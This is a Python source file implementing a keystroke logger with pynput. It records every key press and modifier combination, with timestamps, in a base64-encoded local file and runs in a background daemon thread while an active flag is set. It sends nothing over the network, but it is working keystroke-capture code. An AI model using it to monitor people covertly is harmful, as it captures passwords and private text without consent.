import base64
import datetime
import json
import os
import threading

from pynput import keyboard
from pynput.keyboard import KeyCode, Key


class KeyLogger:
    def __init__(self):
        self.history = {}
        self.pressed = set()
        self.lock = threading.Lock()
        self.active = False

    def save(self):
        with self.lock:
            try:
                existing = {}

                if os.path.exists("key-log"):
                    with open("key-log", "rb") as file:
                        raw = file.read()

                    if raw:
                        decoded = base64.b64decode(raw).decode("utf-8")
                        existing = json.loads(decoded)

                for date, hours in self.history.items():
                    existing.setdefault(date, {})

                    for hour, minutes in hours.items():
                        existing[date].setdefault(hour, {})

                        for minute, seconds in minutes.items():
                            existing[date][hour].setdefault(minute, {})

                            for second, keys in seconds.items():
                                existing[date][hour][minute].setdefault(
                                    second, []
                                )
                                existing[date][hour][minute][second].extend(keys)

                data = json.dumps(
                    existing,
                    indent=2,
                    ensure_ascii=False
                ).encode("utf-8")

                with open("key-log", "wb") as file:
                    file.write(base64.b64encode(data))

                self.history = existing

            except Exception as e:
                print(f"Logs history saving error: {e}")

    def load(self):
        if not os.path.exists("key-log"):
            return

        try:
            with open("key-log", "rb") as file:
                raw = file.read()
            if not raw:
                return

            data = base64.b64decode(raw).decode("utf-8")
            with self.lock:
                self.history = json.loads(data)

        except Exception as e:
            print(f"Logs history loading error: {e}")

    def clear(self):
        self.history = {}

    def set_active(self, state: bool):
        self.active = state

    def start(self):
        threading.Thread(
            target=self._run,
            daemon=True
        ).start()

    def _run(self):
        with keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        ) as listener:
            listener.join()

    @staticmethod
    def _get_modifier(key):
        if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r):
            return "ctrl"
        if key in (Key.shift, Key.shift_l, Key.shift_r):
            return "shift"
        if key in (Key.alt, Key.alt_l, Key.alt_r, Key.alt_gr):
            return "alt"
        if key in (Key.cmd, Key.cmd_l, Key.cmd_r):
            return "cmd"
        return None

    @staticmethod
    def _get_key_name(key):
        if isinstance(key, KeyCode):
            if key.char is not None and key.char.isprintable():
                return key.char

            if key.vk is not None and 65 <= key.vk <= 90:
                return chr(key.vk).lower()

            return f"vk_{key.vk}" if key.vk is not None else None

        if isinstance(key, Key):
            return str(key).replace("Key.", "").lower()

        return None

    def _get_combo(self, key):
        name = self._get_key_name(key)
        if name is None:
            return None

        modifiers = [
            modifier
            for modifier in ("ctrl", "alt", "shift", "cmd")
            if modifier in self.pressed
        ]

        return "+".join(modifiers + [name])

    def _save_key(self, key_name):
        now = datetime.datetime.now()

        date = now.strftime("%Y-%m-%d")
        hour = now.strftime("%H")
        minute = now.strftime("%M")
        second = str(now.second // 10)

        with self.lock:
            self.history.setdefault(date, {})
            self.history[date].setdefault(hour, {})
            self.history[date][hour].setdefault(minute, {})
            self.history[date][hour][minute].setdefault(second, [])
            self.history[date][hour][minute][second].append(key_name)

    def _on_press(self, key: Key | KeyCode | None):
        if not self.active:
            return

        modifier = self._get_modifier(key)

        if modifier:
            self.pressed.add(modifier)
            self._save_key(modifier)
            return

        combo = self._get_combo(key)
        if combo is not None:
            self._save_key(combo)

    def _on_release(self, key: Key | KeyCode | None):
        if not self.active:
            return

        modifier = self._get_modifier(key)

        if modifier:
            self.pressed.discard(modifier)
